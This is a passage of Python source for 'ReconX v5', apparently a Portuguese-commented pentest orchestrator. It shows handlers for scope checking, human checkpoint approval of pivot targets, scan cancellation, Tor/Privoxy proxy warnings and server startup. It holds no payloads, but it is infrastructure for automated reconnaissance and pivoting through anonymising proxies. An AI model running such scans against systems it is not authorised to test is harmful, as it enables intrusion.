        'proxy': proxy_status(),
    })

    # Aviso forte se o proxy estiver ativo porém inacessível — senão TODAS as
    # tools vão falhar com "connection refused" (ex.: Tor/Privoxy não iniciado).
    pstat = proxy_status()
    if pstat.get('active') and not pstat.get('reachable'):
        emit('proxy_warning', {
            'message': (f"Proxy {pstat.get('label', pstat.get('profile'))} ativo mas "
                        f"INACESSÍVEL ({pstat.get('http') or pstat.get('socks')}). "
                        f"As ferramentas serão bloqueadas. Inicie o serviço "
                        f"(ex.: sudo service tor start && sudo service privoxy start) "
                        f"ou troque para 'Sem proxy'."),
            'profile': pstat.get('profile'),
        })

    intensity = data.get('intensity', 'full')
    threading.Thread(
        target=run_pipeline,
        args=(scan_id, pipeline_def, target, custom_stages, sid, intensity),
        daemon=True
    ).start()

def _in_scope(value, scope_list):
    """Verifica se um valor (host/IP/URL) está dentro do escopo definido."""
    if not scope_list:
        return True  # sem escopo = tudo permitido
    import ipaddress, urllib.parse
    val = value.strip().lower()
    parsed = urllib.parse.urlparse(val if '://' in val else f'http://{val}')
    host = parsed.hostname or val
    for s in scope_list:
        s = s.strip().lower()
        try:
            # CIDR match
            net = ipaddress.ip_network(s, strict=False)
            try:
                if ipaddress.ip_address(host) in net:
                    return True
                continue
            except ValueError:
                pass
        except ValueError:
            pass
        # Domínio / sufixo
        if host == s or host.endswith('.' + s):
            return True
    return False

@socketio.on('checkpoint_approve')
def on_approve(data):
    scan_id  = data.get('scan_id')
    approved = data.get('approved_targets', [])
    scope    = data.get('scope', [])
    sid = request.sid

    # Scope validation: sinalizar targets fora do escopo
    if scope:
        out_of_scope = [t for t in approved if not _in_scope(t, scope)]
        if out_of_scope:
            emit('scope_warning', {
                'scan_id': scan_id,
                'out_of_scope': out_of_scope,
                'message': f'{len(out_of_scope)} target(s) fora do escopo definido',
            })
            approved = [t for t in approved if _in_scope(t, scope)]

    scan = active_scans.get(scan_id)
    if not scan: emit('error', {'message': 'Scan não encontrado'}); return

    remaining    = scan.get('remaining_stages', [])
    all_results  = scan.get('all_results', {})
    all_followups = scan.get('all_followups', [])
    initial_target = scan['target']
    scan['status'] = 'running'

    emit('checkpoint_resumed', {
        'scan_id': scan_id, 'approved_count': len(approved),
        'next_stage': remaining[0]['name'] if remaining else '—'
    })

    def resume():
        current = approved
        for i, stage in enumerate(remaining):
            if scan.get('cancelled'): break
            sr, extracted = run_stage(scan_id, stage, current, sid, scan.get('intensity', 'full'))
            all_results[stage['id']] = sr
            for tk in stage['tools']:
                all_followups.extend(TOOLS.get(tk, {}).get('manual_followup', []))
            if i < len(remaining) - 1:
                pivots = [t for t in extracted if t.get('type') in ('host', 'url', 'path')]
                if pivots:
                    scan.update({'status':'checkpoint','remaining_stages':remaining[i+1:],
                        'all_results':all_results,'all_followups':all_followups,
                        'pending_targets':pivots})
                    socketio.emit('checkpoint', {
                        'scan_id':scan_id,'after_stage':stage['id'],
                        'after_stage_name':stage['name'],
                        'next_stage':remaining[i+1]['name'],
                        'targets':pivots,'total':len(pivots),
                        'manual_followups':list(set(all_followups)),
                    }, room=sid)
                    return
                # Sem novos pivôs: mantém os mesmos alvos no próximo estágio.
        _finish(scan_id, all_results, initial_target, all_followups, sid)

    threading.Thread(target=resume, daemon=True).start()

@socketio.on('cancel_scan')
def on_cancel(data):
    scan_id = data.get('scan_id')
    if scan_id in active_scans:
        active_scans[scan_id]['cancelled'] = True
        for p in active_scans[scan_id]['processes'].values():
            try: p.terminate()
            except: pass
        emit('scan_cancelled', {'scan_id': scan_id})

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="ReconX v5 — orquestrador de pentest")
    parser.add_argument('--host', default='127.0.0.1',
        help="Endereço de bind (padrão 127.0.0.1; use --expose para 0.0.0.0)")
    parser.add_argument('--port', type=int, default=5000, help="Porta (padrão 5000)")
    parser.add_argument('--expose', action='store_true',
        help="Expoe na rede local (0.0.0.0) — use com cautela")
    parser.add_argument('--debug', action='store_true', help="Modo debug do Flask")
    args = parser.parse_args()

    host = '0.0.0.0' if args.expose else args.host
    print(f"[*] ReconX v5 — {host}:{args.port}")
    print(f"  DB:        {DB_PATH}")
    print(f"  Wordlists: common={WL_COMMON}, small={WL_SMALL}")
    print(f"  Results:   {RESULTS_DIR}")
    print(f"  Timeout:   {DEFAULT_TOOL_TIMEOUT}s (padrao por tool)")
    if host == '0.0.0.0':
        print("  [!] Bind em 0.0.0.0 — qualquer host na rede pode disparar scans")
    print()
    socketio.run(app, host=host, port=args.port, debug=args.debug)
